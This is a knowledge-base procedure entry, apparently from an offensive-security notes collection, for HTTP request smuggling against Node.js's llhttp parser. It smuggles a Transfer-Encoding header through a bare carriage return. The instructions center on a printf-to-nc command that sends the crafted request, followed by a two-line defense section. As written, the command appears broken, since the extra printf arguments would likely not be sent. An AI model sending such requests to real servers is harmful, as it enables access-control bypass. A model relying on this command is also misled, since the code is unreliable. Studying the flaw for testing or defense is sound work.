---
tags:
  - http-request-smuggling
  - exploit
type: procedure
tools:
  - '[[tools/printf]]'
  - '[[tools/nc]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/printf-nc-send-crafted-request]]'
platforms:
  - Node.js
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 565a31da-5ef6-4dd0-8063-88aa18bb5cbb
created_at: '2025-12-13T09:01:17.671Z'
updated_at: '2025-12-13T09:01:17.671Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send Crafted HTTP Request for Header Smuggling

## Summary

This procedure crafts and sends a malformed HTTP request to exploit the llhttp parser's acceptance of single CR delimiters, smuggling additional headers like Transfer-Encoding.

## Description

By embedding a CR in a header value, the parser misinterprets it as a delimiter, allowing smuggling of chunked encoding. This can lead to access control bypass in proxy-backend setups.

## Requirements

1. Running Node.js server on localhost:5000
2. Tools: printf and nc installed
3. Knowledge of HTTP request formatting

## Defense

Defensive measures and detection strategies:

- Enforce strict header validation in proxies
- Use WAF to detect malformed requests

## Objectives

1. Smuggle headers via CR exploitation
2. Demonstrate parsing vulnerability
3. Prepare for verification of impact

## Instructions

### Step 1: Craft and Send Request

**Context**: Use printf to build the request with embedded CR and pipe to nc for transmission.

**Command** ([[commands/printf-nc-send-crafted-request]]):

```bash
printf "POST / HTTP/1.1\r\n" "Host: localhost:5000\r\n" "X-Abc:\rxTransfer-Encoding: chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
```

> This sends a POST request with smuggled chunked encoding.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/printf-nc-send-crafted-request]]

## Tools Used

- [[tools/printf]]
- [[tools/nc]]

## Tags

- [[http-request-smuggling]]
- [[exploit]]
